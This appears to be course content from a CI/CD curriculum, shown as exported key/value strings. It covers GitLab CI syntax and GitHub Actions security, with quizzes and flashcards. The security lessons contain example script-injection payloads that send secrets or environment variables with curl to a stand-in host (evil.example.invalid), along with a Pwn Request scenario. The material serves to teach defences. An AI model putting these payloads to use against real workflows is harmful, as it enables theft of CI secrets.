hintsEn: Add `if: ${{ !cancelled() }}` right below `- name: Upload Playwright HTML report`.

cicd-ex-c08-5.titleEn: Eliminate blind sleep 30 with a deterministic port-probing loop
cicd-ex-c08-5.promptEn:
The `Wait for server` step uses an arbitrary `sleep 30` that both wastes time and flakes with `ECONNREFUSED` during peak hours.

Remove `sleep 30` and replace it with the deterministic probe command:
`curl --fail --retry 15 --retry-connrefused --retry-delay 2 http://localhost:3000/healthz`
hintsEn: Replace the exact `sleep 30` line with `curl --fail --retry 15 --retry-connrefused --retry-delay 2 http://localhost:3000/healthz`, keeping `npm start &` above and `npm run test:e2e` below.

C09.titleEn: Practical GitLab CI/CD: Translating GitHub Actions to .gitlab-ci.yml
C09.summaryEn: Master modern .gitlab-ci.yml syntax: stages, default.image, breaking stage barriers with DAG needs, managing cache policy pull-push vs pull, parallel sharding, and rules.

steps.headingEn: Overview & Context
steps.bodyEn:
While GitHub Actions dominates open-source communities and cloud-native projects, across many banks, telecom corporations, and enterprises running self-managed infrastructure (*Self-managed / On-premise*), **GitLab CI/CD** is the most widely adopted platform.

- [x] **90% of the underlying principles remain identical:** **Ephemeral Containers**, **Lockfile Caching**, **Artifacts**, **DAG** graphs, and **Sharding** all operate on the exact same core mechanics.
- [>] **The main differences lie in syntax and default environment:** The entire pipeline is defined in a single ==`.gitlab-ci.yml`== file at the repository root. Whereas GitHub Actions gives you a blank Ubuntu VM by default and expects you to call `actions/setup-node@v4`, **GitLab Runner (Docker / Kubernetes Executor)** launches each job directly inside **a Docker Container**: simply declare `image: node:22-alpine` under `default:` and the whole pipeline gets Node 22 out of the box.

steps.headingEn: Optimizing Cross-Stage Parallel Execution with the needs: Keyword
steps.bodyEn:
In GitLab CI's traditional model, jobs are grouped into phases in `stages: [install, test, build, deploy]`. By default, **100% of jobs in an earlier stage must finish before any job in the next stage is allowed to start**!

This creates pointless bottlenecks when a lightweight config syntax check or `lint_code` job is forced to wait behind a heavy compilation job in the previous stage. The ==`needs:`== keyword activates the **DAG (Directed Acyclic Graph)** scheduler to eliminate this bottleneck:

- [x] **Writing `needs: []` (empty array):** Lets a job **completely bypass `stages` ordering barriers and launch immediately at second 0** as soon as the pipeline starts!
- [x] **Writing `needs: ["install_deps"]`:** Starts immediately as soon as `install_deps` alone completes, while also downloading only the `artifacts` from jobs listed in `needs` to save network bandwidth.

```visual
kind: flow
title: Luồng Điều Phối Kết Hợp Stages + Needs DAG + Cache Policy Chuẩn Mực

  - icon: zap
```

steps.headingEn: Standard Cache Management on GitLab: key.files & policy: pull-push vs pull
steps.bodyEn:
Unlike GitHub Actions where `~/.npm` sits outside the repository directory, GitLab Runner **only allows caching paths located inside the project working directory (`$CI_PROJECT_DIR`)**.

Therefore, the golden recipe for Node.js on GitLab CI is pointing the npm cache to `.npm/` inside the project (`npm ci --cache .npm --prefer-offline`) and cleanly separating read/write policies:

- [>] **Global default (`policy: pull`):** All downstream test jobs only pull `.npm/` to read, **completely skipping cache compression and re-upload at the end of the job** to save tens of seconds of I/O.
- [>] **Upstream install job only (`policy: pull-push`):** Only `install_deps` has permission to write and update the cache when `package-lock.json` changes.

```yaml
default:
  image: node:22-alpine
  cache:
    key:
      files:
        - package-lock.json
    paths:
      - .npm/
    policy: pull              # Mặc định mọi Job chỉ kéo cache về ĐỌC (nhanh & sạch!)

stages: [install, test, build, deploy]

install_deps:
  stage: install
  cache:
    key:
      files:
        - package-lock.json
    paths:
      - .npm/
    policy: pull-push         # CHỈ duy nhất Job đầu nguồn này được phép GHI cập nhật cache!
  script:
    - npm ci --cache .npm --prefer-offline

unit_test:
  stage: test
  needs: ["install_deps"]
  parallel: 4                 # Tự cấp $CI_NODE_INDEX (1..4) và $CI_NODE_TOTAL (4)
  script:
    - npm ci --cache .npm --prefer-offline
    - npx vitest run --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL
```

---

steps.headingEn: Replacing Legacy only/except with Standard GitLab CI rules: Syntax
steps.bodyEn:
In older 2019–2020 documentation, you might encounter keywords like `only: [main]` or `except: [tags]`. GitLab has officially **deprecated `only:` / `except:` and recommends removing them completely** because they lack compound boolean logic and frequently cause *Duplicate Pipelines* (running twice for both branch pushes and Merge Requests).

```visual
kind: compare
title: "Cú Pháp Điều Kiện Chạy Job: Cũ Kỹ (only/except) vs Hiện Đại (rules:)"
subtitle: "Khối rules: duyệt tuần tự từ trên xuống dưới như câu lệnh switch-case và kiểm soát chặt cổng duyệt tay Production"
left:
  badge: "ĐÃ LỖI THỜI · Ngừng khuyến nghị"
  title: "Cú pháp cũ only: / except: & Lưu ý với when: manual"
  tone: rose
  code: |
    deploy_prod:
      stage: deploy
      only:
        - main
      when: manual
      # LƯU Ý QUAN TRỌNG: Thiếu allow_failure: false!
      # Mặc định when: manual mang allow_failure: true
      script:
        - ./scripts/deploy.sh production
  lang: yaml
  bullets:
    - "`only:` và `except:` không còn được GitLab phát triển thêm, khó viết điều kiện kết hợp `$CI_PIPELINE_SOURCE`"
    - "**Điểm dễ nhầm lẫn:** Khi đặt `when: manual` mà quên ghi `allow_failure: false`, GitLab mặc định coi bước đó là **tùy chọn (`allow_failure: true`)** — không chặn trạng thái thành công chung của Pipeline."
right:
  badge: "CHUẨN HIỆN ĐẠI 2026 · Blocking Gate"
  title: "Khối rules: tường minh kèm allow_failure: false"
  tone: emerald
  code: |
    deploy_prod:
      stage: deploy
      script:
        - ./scripts/deploy.sh production
      rules:
        - if: '$CI_COMMIT_BRANCH == "main"'
          when: manual
          allow_failure: false
  lang: yaml
  bullets:
    - "Dùng hoàn toàn ==`rules:`== với các biến ngữ cảnh rõ ràng như `$CI_COMMIT_BRANCH` và `$CI_PIPELINE_SOURCE`"
    - "Đi kèm ==`allow_failure: false`== cạnh `when: manual` biến Job thành **Blocking Manual Action** — bắt buộc Quản lý Kỹ thuật bấm nút Play mới hoàn tất phát hành!"
```

> [!WARNING] Keep GitLab Runner's Cache Path Limit Top of Mind!
> Never write `paths: ["~/.npm"]` or `/root/.npm` in `.gitlab-ci.yml` — GitLab Runner will immediately emit a warning and skip caching because the path lies outside `$CI_PROJECT_DIR`. Always use a relative subdirectory like `.npm/` paired with `--cache .npm`!

### Comparing Popular Enterprise CI/CD Platforms

When designing platform architecture (*Platform Engineering*) or selecting tooling for an organization, you will frequently compare **GitHub Actions** and **GitLab CI/CD** against other major platforms on the market:

| CI/CD Platform | Config File | Core Strengths & Best-Fit Environments | Practical Trade-offs / Caveats |
| :--- | :--- | :--- | :--- |
| **GitHub Actions** | `.github/workflows/*.yml` | World's largest community Action ecosystem; seamless PR, OIDC & Cloud integration | Requires declaring separate Actions for Cache/Artifact; prone to sprawl if copy-pasting many YAML files |
| **GitLab CI/CD** | `.gitlab-ci.yml` | Container-native **All-in-one DevSecOps**; standard for Banking / self-hosted On-premise | Tightly coupled to GitLab platform; Caches must reside inside `$CI_PROJECT_DIR` |
| **Jenkins** | `Jenkinsfile` (Groovy) | Long-standing enterprise standard (*Enterprise Legacy*); highly flexible custom scripting | Heavy Controller server maintenance and frequent Plugin version conflicts during upgrades |
| **CircleCI / Buildkite** | `.circleci/config.yml` / `.buildkite/pipeline.yml` | Blazing-fast caching & sharding; **Buildkite** excels at Cloud control plane + thousands of internal runners | Incurs external SaaS platform costs instead of being built natively into the Git host |
| **Dagger** | TS / Python / Go code | Write pipelines as real code running on BuildKit Containers — **runs identically on laptops and every CI**! | Requires teams to adopt an SDK mindset rather than pure YAML |

> [!REMEMBER] Key Takeaways
> - **`default:`** declares a shared `image: node:22-alpine` at the top of the file · **`artifacts:`** are automatically downloaded by later stages without a manual download step.
> - **`needs: []`** starts a job immediately at second `0` · **`cache: { policy: pull }`** lets test jobs read cache without re-compressing and uploading.
> - **`parallel: 4`** auto-generates **`$CI_NODE_INDEX`** (`1..4`) and **`$CI_NODE_TOTAL`** (`4`).
> - Completely replace `only/except` with **`rules:`**, and always attach **`allow_failure: false`** to a `when: manual` Production gate!

readings.noteEn: Standard Node.js 22 .gitlab-ci.yml blueprint using default.image, DAG needs bypassing sequential stage barriers, and artifacts with expire_in retention.
readings.taskEn: Explain why in GitLab CI, jobs in the deploy stage automatically have the dist/ directory from the build stage without writing a manual download-artifact command like in GitHub Actions.
readings.answerEn: In GitLab CI, all artifacts produced in earlier stages are automatically downloaded by default into all jobs in subsequent stages (or selectively downloaded from only the jobs listed in the `needs:` array).

readings.noteEn: How to configure a standard .npm/ cache inside a GitLab project directory with a Cache Key hashed from package-lock.json and separated pull-push write vs pull read-only policies.
readings.taskEn: Why must we place the cache directory at .npm/ inside the project on GitLab CI instead of ~/.npm (/root/.npm) as on GitHub Actions?
readings.answerEn: GitLab Runner can only archive and cache files/directories located inside the project's working directory ($CI_PROJECT_DIR); any external path like /root/.npm is ignored and will not be cached.

readings.noteEn: Legacy config file using deprecated only: and except: keywords that GitLab recommends migrating to the rules: block.
readings.taskEn: Compare the clarity of combining a main-branch condition with a manual approval gate between the legacy syntax and the new rules: block.
readings.answerEn: With `rules:`, all branch condition logic (`if: $CI_COMMIT_BRANCH == "main"`), trigger mode (`when: manual`), and pipeline-blocking behavior (`allow_failure: false`) are cleanly consolidated into a single readable block without causing duplicate pipelines.

C09-Q1.qEn: In `.gitlab-ci.yml`, if you want a job in the `test` stage to start **immediately at second 0** without waiting for jobs in the `install` stage to finish, which property do you declare?
choicesEn: fast_start: true
needs: []
stage: immediate
parallel: 0
C09-Q1.explainEn: An empty array `needs: []` tells GitLab's DAG scheduler that this job has no prerequisites and can run immediately as soon as the pipeline is created.

C09-Q2.qEn: In GitLab CI, when you declare `parallel: 4` on a test job, which built-in environment variable indicates the **current shard index** (`1..4`) of the running container? (Include the leading `$`)
C09-Q2.explainEn: GitLab automatically provides the pair of variables `$CI_NODE_INDEX` (1, 2, 3, 4) and `$CI_NODE_TOTAL` (4) for any job using `parallel: 4`.

C09-Q3.qEn: On GitLab CI, the legacy `only:` and `except:` keywords are deprecated and should be completely replaced by the modern `rules:` block.
C09-Q3.explainEn: Correct! Official GitLab documentation marks `only/except` as no longer actively developed and recommends `rules:` for all new projects.

C09-Q4.qEn: So that downstream test jobs on GitLab CI only download the `.npm/` cache for reading and **do not waste time compressing and re-uploading the cache at the end of the job**, which property do you configure inside `cache:`?
choicesEn: policy: pull
policy: push
policy: pull-push
readonly: yes
C09-Q4.explainEn: `policy: pull` acts as a Read-Only Cache: it downloads the cache at the start of the job and completely skips compressing and uploading when the job finishes.

C09-Q5.qEn: What is the default difference when passing `artifacts` between two sequential jobs on GitLab CI compared to GitHub Actions?
choicesEn: GitLab CI does not support saving the dist/ directory as an artifact
On GitLab CI, jobs in later stages automatically download all artifacts from earlier stages without needing a manual download-artifact step
GitLab CI deletes artifacts within 1 second of creation
GitLab CI requires emailing artifacts to the administrator
C09-Q5.explainEn: In GitLab CI, once the `build_app` job declares `artifacts: { paths: ["dist/"] }`, the `dist/` directory automatically appears in the working directory for the `deploy` stage!

C09-Q6.qEn: In GitLab CI, when a rule under `rules:` has `when: manual` but you do NOT explicitly set `allow_failure: false`, GitLab defaults to treating that manual approval as optional (`allow_failure: true`) and does not block the pipeline's overall success status.
C09-Q6.explainEn: Correct! This is a very easy pitfall in GitLab CI: to create a true Blocking Manual Gate that requires someone to click approve, always remember to include `allow_failure: false` alongside `when: manual`.

C09-Q7.qEn: Which top-level keyword at the beginning of `.gitlab-ci.yml` sets a shared `image: node:22-alpine` for all jobs that do not declare their own image?
C09-Q7.explainEn: The `default:` block is the modern standard in `.gitlab-ci.yml` for declaring default `image`, `cache`, `before_script`, and `timeout` across all jobs (replacing the old top-level floating `image:` syntax).

C09-C1.frontEn: What are the four most fundamental skeleton keywords of a `.gitlab-ci.yml` file?
C09-C1.backEn: `stages:` (phase order), `default:` (`image: node:22-alpine`), individual job names with `stage:`, and the `script:` command array.

C09-C2.frontEn: What does the `needs:` keyword do in GitLab CI?
C09-C2.backEn: Switches the pipeline from rigid stage-by-stage waiting to a DAG: a job runs as soon as the jobs in `needs` finish (or runs immediately at second 0 if `needs: []`).

C09-C3.frontEn: How do `cache.policy: pull-push` and `cache.policy: pull` differ in GitLab CI?
C09-C3.backEn: `pull-push` downloads the cache at job start and writes updates at job end (for the root install job); `pull` only downloads to read without uploading (for parallel test jobs).

C09-C4.frontEn: How do you split a test suite into 4 parallel shards in GitLab CI?
C09-C4.backEn: Add `parallel: 4` to the job and pass `--shard=$CI_NODE_INDEX/$CI_NODE_TOTAL` to the test command.

C09-C5.frontEn: How do you write a blocking manual approval gate for Production deployment on `main` using GitLab `rules:`?

C09-C6.frontEn: What crucial path constraint applies when declaring `cache.paths` on GitLab Runner?
C09-C6.backEn: Every path in `cache.paths` must reside inside the project directory `$CI_PROJECT_DIR` (e.g., `.npm/` instead of `~/.npm`).

C09-C7.frontEn: Quick comparison of Jenkins, Buildkite, and Dagger alongside GitHub Actions / GitLab CI?
C09-C7.backEn:
- **Jenkins**: long-standing enterprise legacy platform (Groovy `Jenkinsfile`, self-managed Controller + Plugins).
- **CircleCI / Buildkite**: high speed, strong Hybrid model (Cloud orchestration + runners inside internal VPC).
- **Dagger**: write pipelines in real code (TS/Python/Go) running on BuildKit Containers identically on laptops and every CI.

cicd-ex-c09-1.titleEn: Initialize standard stages and default.image skeleton for .gitlab-ci.yml
cicd-ex-c09-1.promptEn:
Set up the header of `.gitlab-ci.yml` for a Node.js service:

1. Declare the `stages` array in the exact 4-phase order: `["install", "test", "build", "deploy"]`.

cicd-ex-c09-2.titleEn: Separate pull-push write access and pull read-only cache in GitLab CI
cicd-ex-c09-2.promptEn:
Optimize the `.npm/` cache keyed by `package-lock.json` in `.gitlab-ci.yml`:

1. On job `install_deps`: configure `cache.key.files: ["package-lock.json"]`, `cache.paths: [".npm/"]`, and `cache.policy: pull-push`.
2. On job `unit_test`: configure `cache.key.files: ["package-lock.json"]`, `cache.paths: [".npm/"]`, and read-only mode **`cache.policy: pull`**.
hintsEn: Set `pull-push` for `install_deps` and `pull` for `unit_test`.

cicd-ex-c09-3.titleEn: Enable early DAG execution with needs: [] and publish expiring artifacts
cicd-ex-c09-3.promptEn:
Speed up and clean up storage in `.gitlab-ci.yml`:

1. Allow job `lint_docs` (in the `test` stage) to run immediately at second 0 without waiting for the `install` stage by adding `needs: []`.
2. On job `build_app` (in the `build` stage), add an `artifacts` block saving `paths: ["dist/"]` with auto-expiration `expire_in: "7 days"`.
hintsEn: `needs: []` goes right under `stage: test` in `lint_docs`.
In `build_app`, add `artifacts:\n    paths: ["dist/"]\n    expire_in: "7 days"`.

cicd-ex-c09-4.titleEn: Shard a Vitest suite across 4 parallel containers using parallel in GitLab CI
cicd-ex-c09-4.promptEn:
Distribute the `vitest_suite` test job across **4 parallel containers** on GitLab CI:

1. Add `parallel: 4` to the `vitest_suite` job.
2. Update the command in `script` to run `npx vitest run --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL`.
hintsEn: GitLab automatically provides `$CI_NODE_INDEX` and `$CI_NODE_TOTAL` when you enable `parallel: 4`.

cicd-ex-c09-5.titleEn: Upgrade legacy only: [main] syntax to a modern rules: manual approval gate
cicd-ex-c09-5.promptEn:
The `deploy_prod` job uses the deprecated legacy `only: [main]` syntax. Upgrade it to a modern **`rules:`** block with a pipeline-blocking manual approval gate:

1. Completely remove the `only:` field (and any top-level `when:` if present).
2. Add a `rules:` array whose first item checks:
   - `if: '$CI_COMMIT_BRANCH == "main"'`
   - `when: manual`
   - `allow_failure: false`
hintsEn: Wrap the condition expression in single quotes so YAML does not choke on the inner double quotes: `if: '$CI_COMMIT_BRANCH == "main"'`.

C10.titleEn: GitHub Actions Security: GITHUB_TOKEN Permissions, Preventing Script Injection & SHA Pinning
C10.summaryEn: Lock down GITHUB_TOKEN to least privilege, eliminate Remote Code Execution via PR titles (Script Injection), prevent Pwn Requests from forks, and pin 40-character commit SHAs.

steps.headingEn: Overview & Context
steps.bodyEn:
Many developers focus heavily on securing application source code in Production while overlooking a critical reality: **CI/CD Runner servers are high-value attack targets** because they concentrate sensitive access privileges.

- [!] **Concentrated privileges:** Runners hold write access to the Git repository (`GITHUB_TOKEN`), credentials to push Container Images to registries, and deployment permissions to AWS/Kubernetes infrastructure.
- [!] **Internet-facing attack surface:** A single misconfiguration in `.github/workflows/` can allow an external attacker to open a Pull Request and achieve **Remote Code Execution (RCE)** right inside your organization's Runner.

```visual
kind: groups
```

steps.headingEn: Restricting GITHUB_TOKEN with the Principle of Least Privilege (permissions:)
steps.bodyEn:

```visual
callouts:

  - num: 2

    tone: emerald
```

Whenever a workflow runs, GitHub automatically provisions a temporary authentication token called **`GITHUB_TOKEN`**. On repositories or organizations that haven't tightened default settings, this token carries **`write-all`** permissions — allowing any compromised test step to push commits to branches, tamper with Releases, or delete packages.

The mandatory security baseline is the **Principle of Least Privilege**: **lock permissions down to read-only (==`contents: read`==) at the top of the Workflow file, and grant localized write permissions (`packages: write`) only to the specific job that actually needs them**. *(This works just like issuing a keycard that opens only the one required room rather than a master key for the entire building.)*

```yaml
name: Hardened CI
on: [pull_request]

# 1) Khoá mặc định toàn bộ các Job về chế độ CHỈ ĐỌC mã nguồn!
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Kế thừa permissions: contents: read -> An toàn tuyệt đối khi chạy npm test!
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  push-image:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    # 2) CHỈ mở thêm quyền ghi gói ảnh cho duy nhất Job đóng gói này!
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - run: echo "Build & push container image..."
```

steps.headingEn: Preventing Script Injection When Handling Untrusted Input
steps.bodyEn:
**Script Injection** occurs when you directly interpolate context expressions (such as `${{ github.event.pull_request.title }}`) inside a `run:` command block. Because GitHub Actions' preprocessor **substitutes `${{ ... }}` text before passing the script to the `bash` interpreter**, an attacker can inject command terminators like `"; curl ... #` to execute arbitrary shell commands. *(This mirrors SQL Injection in backend development when directly concatenating user input into a query string.)*

Suppose an attacker opens a PR titled:
`feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #`

The actual command executed on the Runner after text interpolation turns into:

```bash
echo "Đang kiểm tra PR: feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #"
```

```visual
kind: compare
title: "Cơ chế gây lỗ hổng Script Injection và cách khắc phục qua biến môi trường env:"
subtitle: "Mọi dữ liệu do người mở PR kiểm soát (title, body, comment, commit message, và tên nhánh head.ref) đều là đầu vào không tin cậy"
left:
  badge: "LỖ HỔNG RCE · Nối thẳng vào run:"
  title: "GitHub nội suy văn bản trước khi Bash chạy"
  tone: rose
  code: |
    # LỖ HỔNG BẢO MẬT: Nội suy trực tiếp vào shell!
    - name: Kiểm tra tiêu đề & nhánh PR
      run: |
        echo "PR: ${{ github.event.pull_request.title }}"
        echo "Branch: ${{ github.event.pull_request.head.ref }}"
  lang: yaml
  bullets:
    - "Biểu thức `${{ ... }}` bị bung thẳng thành mã nguồn kịch bản shell trước khi `bash` phân tích cú pháp"
    - "Ký tự `\";` hoặc `$(...)` trong `pull_request.title`, `pull_request.body`, hay ngay cả tên nhánh ==`github.event.pull_request.head.ref`== sẽ thực thi lệnh độc tuỳ ý!"
right:
  badge: "AN TOÀN TUYỆT ĐỐI · Trung gian qua env:"
  title: "Lưu vào bộ nhớ biến môi trường của tiến trình"
  tone: emerald
  code: |
    # CHUẨN BẢO MẬT: Truyền qua env: giống Parameterized Query ($1)
    - name: Kiểm tra tiêu đề & nhánh PR an toàn
      env:
        PR_TITLE: ${{ github.event.pull_request.title }}
        PR_BRANCH: ${{ github.event.pull_request.head.ref }}
      run: |
        echo "PR: $PR_TITLE"
        echo "Branch: $PR_BRANCH"
  lang: yaml
  bullets:
    - "Hệ điều hành nạp giá trị vào vùng nhớ ==`env:`== của tiến trình mà **không bao giờ phân tích cú pháp lệnh shell**"
    - "Bọc biến trong dấu nháy kép `\"$PR_TITLE\"` giúp mọi ký tự đặc biệt chỉ được in ra như chuỗi văn bản thuần tuý"
```

steps.headingEn: Preventing Pwn Requests: pull_request vs pull_request_target
steps.bodyEn:
Why does GitHub offer two events that are so dangerously easy to confuse?

```visual
kind: compare
title: "Phân biệt pull_request và pull_request_target với PR từ kho Fork"
subtitle: "Dùng sai hậu tố _target có thể làm lộ toàn bộ Secrets Production cho người lạ từ bên ngoài"
left:
  badge: "LỖ HỔNG NGHIÊM TRỌNG · Pwn Request"
  title: "on: pull_request_target + Checkout code của PR"
  tone: rose
  code: |
    # RỦI RO BẢO MẬT CAO: Chạy trong ngữ cảnh nhánh main!
    on: pull_request_target
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci && npm test   # Chạy postinstall của kẻ tấn công!
  lang: yaml
  bullets:
    - "Chạy tệp YAML trên nhánh gốc `main` với **đầy đủ quyền ghi `GITHUB_TOKEN` và đọc được toàn bộ `secrets` của dự án**"
    - "Khi checkout `pull_request.head.sha` từ kho Fork về chạy `npm ci` / `npm test`, kẻ tấn công chỉ cần gài lệnh vào `\"postinstall\"` trong `package.json` là có thể trích xuất toàn bộ Secrets."
right:
  badge: "AN TOÀN MẶC ĐỊNH · Cô lập hộp cát"
  title: "on: pull_request cho mọi bước Build / Lint / Test"
  tone: emerald
  code: |
    # CẤU HÌNH CHUẨN CHO CI KIỂM THỬ PR:
    on: pull_request
    permissions:
      contents: read
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: npm ci && npm test
  lang: yaml
  bullets:
    - "Đối với mọi PR mở từ kho Fork bên ngoài, GitHub **tự động giới hạn quyền (`read-only`) và ẩn hoàn toàn kho `secrets`**"
    - "An toàn để biên dịch mã nguồn mới, chạy `eslint`, `vitest` mà không lo rò rỉ tài nguyên nội bộ"
```

steps.headingEn: Supply Chain Security via 40-Character Commit SHA Pinning
steps.bodyEn:
In March 2025, a landmark supply-chain incident involving the popular `tj-actions/changed-files` Action sent a wake-up call across the industry: attackers compromised a third-party Action repository and **re-pointed all version tags (`@v4`, `@v45`) to a malicious commit designed to dump Runner RAM and exfiltrate Secrets**!

In Git, a version tag like `@v4`, `@v0.28.0`, or a branch name like `@master` is merely a **mutable pointer (*Mutable Tag*)** — the repo owner (or an account hijacker) can overwrite it to point at malware overnight! Only a ==full 40-character hexadecimal Commit SHA hash== (`0-9`, `a-f`) is a mathematically immutable identifier:

```yaml
# RỦI RO VỚI ACTION BÊN THỨ BA: Thẻ @master hoặc @v0.28.0 có thể bị force-push đổi đích ngầm!
- uses: aquasecurity/trivy-action@master

# CHUẨN DOANH NGHIỆP: Ghim cứng SHA đầy đủ 40 ký tự kèm ghi chú phiên bản dễ đọc bên cạnh!
- uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0
```

- [x] **For official GitHub-maintained `actions/*` Actions** (such as `actions/checkout@v4`, `actions/setup-node@v4`): pinning `@v4` is the minimum acceptable baseline (or pin a 40-char SHA in strict financial environments).
- [x] **For ALL third-party Actions (`owner/repo`):** you must hard-pin the **exact 40-character Commit SHA** and let Dependabot / Renovate automatically open PRs to bump the SHA when new releases arrive!

```visual
kind: troubleshoot
title: Danh Mục Rà Soát Nhanh Lỗ Hổng Bảo Mật Trên Tệp Workflow
items:
  - symptom: "Workflow không có khối permissions: ở đầu tệp"
    badge: Đặc quyền thừa
    tone: amber
    cause: "Trên kho cấu hình cũ, GITHUB_TOKEN mặc định mang quyền write-all trên cả Contents, Packages, Releases và Pull Requests."
    fix: "Thêm permissions: { contents: read } ngay ở cấp gốc Workflow; chỉ cấp thêm quyền ghi cục bộ tại từng Job cần thiết."
    cmd: "permissions:\n  contents: read"
  - symptom: "Xuất hiện ${{ github.event.pull_request.head.ref }} bên trong khối run:"
    badge: Script Injection
    tone: rose
    cause: "Tên nhánh nguồn (head.ref), tiêu đề PR (title), nội dung (body) và commit message đều do người mở PR kiểm soát hoàn toàn."
    fix: "Đưa biểu thức vào khối env: trung gian rồi đặt biến bash trong dấu nháy kép."
    cmd: "env:\n  HEAD_REF: ${{ github.event.pull_request.head.ref }}\nrun: echo \"$HEAD_REF\""
  - symptom: "Dùng Action bên thứ ba với thẻ khả biến kiểu org/action@v4 hoặc @main"
    badge: Supply Chain
    tone: rose
    cause: "Thẻ Git có thể bị kẻ tấn công force-push trỏ sang commit đánh cắp bộ nhớ Runner (như sự cố tj-actions/changed-files năm 2025)."
    fix: "Ghim cứng bằng mã băm Git Commit SHA-1 đầy đủ đúng 40 ký tự hex."
    cmd: "uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0"
```

> [!REMEMBER] Key Takeaways
> - Always set **`permissions: { contents: read }`** at the top of the Workflow file to revoke default write access from `GITHUB_TOKEN`.
> - Prevent **Script Injection**: Never put `${{ github.event... }}` (including `pull_request.title` or `pull_request.head.ref`) directly inside `run:` — always bind it through **`env:`**.
> - Prevent **Pwn Requests**: Use **`on: pull_request`** for all workflows that build/test PR code; never check out untrusted PR code inside `pull_request_target`.
> - Prevent supply-chain attacks: Pin third-party Actions using their **full 40-character Commit SHA**.

readings.noteEn: Classic RCE vulnerability caused by interpolating ${{ github.event.pull_request.title }} directly into a bash command inside run:.
readings.taskEn: Suppose a stranger opens a PR whose title contains `"; printenv | curl -X POST -d @- https://evil.example.invalid #` — what happens on the Runner?
readings.answerEn: The preprocessor injects that literal string into the script before bash runs, causing `";` to terminate the echo command and execute the command that exfiltrates all Runner environment variables to the attacker's server.

readings.noteEn: Complete remediation for Script Injection by routing untrusted PR event data through an intermediate env: environment variable.
readings.taskEn: Why are semicolons or quotes inside a PR title completely harmless when passed via env: PR_TITLE and referenced as "$PR_TITLE" in bash?
readings.answerEn: Because the environment variable's value is passed directly into the OS process memory rather than being re-parsed by the bash interpreter as shell control syntax (just like a Parameterized SQL Query).

readings.noteEn: Pwn Request vulnerability: combining the privileged pull_request_target event with checking out unreviewed source code from a Fork and running npm ci.
readings.taskEn: Explain why running npm ci on Fork code inside a pull_request_target context leaks the project's entire secrets vault.
readings.answerEn: Unlike regular pull_request, pull_request_target grants full access to the base repository's secrets. Running npm ci on attacker-controlled code automatically triggers the postinstall script in package.json, which can read and exfiltrate all secrets!

C10-Q1.qEn: Why does `run: echo "PR: ${{ github.event.pull_request.title }}"` create a Remote Code Execution (**Script Injection**) vulnerability?
choicesEn: Because the echo command is disallowed in GitHub Actions

Because GitHub substitutes the `${{ ... }}` expression text directly into the script BEFORE the shell interpreter parses it, allowing a PR title containing `"; <malicious-cmd>` to break out into a new command
Because Pull Request titles have a maximum length of 10 characters
Because the github.event variable only works on Windows
C10-Q1.explainEn: String interpolation of `${{ ... }}` happens before bash runs. Always assign user-controlled input to an intermediate `env:` block and reference it via `"$PR_TITLE"` in bash!

C10-Q2.qEn: For a standard `lint` and `unit-test` workflow validating Pull Requests from external contributors (Forks), you should use `on: pull_request` instead of `on: pull_request_target`.
C10-Q2.explainEn: Correct! `on: pull_request` automatically downgrades `GITHUB_TOKEN` to `read-only` and hides all `secrets` from Fork PRs, completely eliminating the Pwn Request risk.

C10-Q3.qEn: How many hexadecimal characters are in a full Git Commit SHA hash used to hard-pin a third-party Action version (`uses: owner/repo@<SHA>`)? (Enter the number only)
C10-Q3.explainEn: A standard full Git SHA-1 hash consists of exactly 40 hex characters (`0-9`, `a-f`) — a unique identifier that a repo owner cannot redirect to malware like a `@v1` or `@main` tag.

C10-Q4.qEn: How do you configure `permissions:` for `GITHUB_TOKEN` in a multi-job Workflow to strictly follow the **Principle of Least Privilege**?
choicesEn: Set `permissions: write-all` at the top of the file so you never hit permission errors
Set `permissions: { contents: read }` at the top-level Workflow scope, then grant specific write permissions (like `packages: write`) only inside the exact job that pushes packages
Omit the permissions keyword completely from the YAML file
Store the CEO's personal password in a global environment variable
C10-Q4.explainEn: Locking `contents: read` at the Workflow level ensures no test job can modify the repo, while only the release job receives the minimal permissions it requires.

C10-Q5.qEn: Which technical weakness do supply-chain attacks against third-party Actions (such as the 2025 `tj-actions/changed-files` incident) exploit when users write `uses: org/action@v4`?
choicesEn: Git tags (`@v4`, `@v4.1.0`) are mutable pointers: if the maintainer's account is compromised, attackers can force-move `@v4` to a new commit containing Runner memory-stealing malware
GitHub does not support downloading Actions written in TypeScript
Version v4 runs slower than version v1
git clone does not work over HTTPS
C10-Q5.explainEn: A Git tag can be force-pushed to a different target at any time. Only when pinned by a 40-character Commit SHA will GitHub refuse to load it if the source changes by even a single bit.

C10-Q6.qEn: Beyond `pull_request.title` and `pull_request.body`, even the source branch name `github.event.pull_request.head.ref` is fully controlled by the PR author and can be used for Script Injection if interpolated directly into `run:`.
C10-Q6.explainEn: Correct! An attacker on a Fork can name their branch with special shell control characters; therefore, never write `${{ github.event.pull_request.head.ref }}` directly inside a `run:` block.

C10-Q7.qEn: To restrict the entire Workflow by default to only reading repository source code, what value should be placed after `contents:` inside the `permissions:` block?
C10-Q7.explainEn: `permissions: { contents: read }` revokes all default write permissions across Issues, PRs, Packages, and Releases, retaining only read access to check out source code.

C10-C1.frontEn: How do you completely prevent GitHub Actions Script Injection when processing PR/Issue metadata?
C10-C1.backEn: Never put `${{ github.event... }}` directly inside `run:`. Always bind it via the step's `env:` block (e.g., `PR_TITLE: ${{ github.event.pull_request.title }}`) and reference `"$PR_TITLE"` in the shell.

C10-C2.frontEn: Why does combining `on: pull_request_target` with `actions/checkout` of the PR's head commit create a Pwn Request vulnerability?
